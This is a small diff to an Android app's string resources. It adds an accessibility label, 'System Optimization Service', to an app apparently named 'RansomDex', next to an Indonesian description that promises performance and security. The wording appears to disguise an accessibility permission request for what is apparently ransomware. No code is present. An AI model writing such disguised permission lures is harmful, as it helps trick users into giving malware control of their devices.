@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">RansomDex</string>
+    <string name="accessibility_label">System Optimization Service</string>
     <string name="accessibility_desc">Memberikan akses optimasi sistem untuk performa yang lebih baik dan keamanan perangkat.</string>
 </resources>
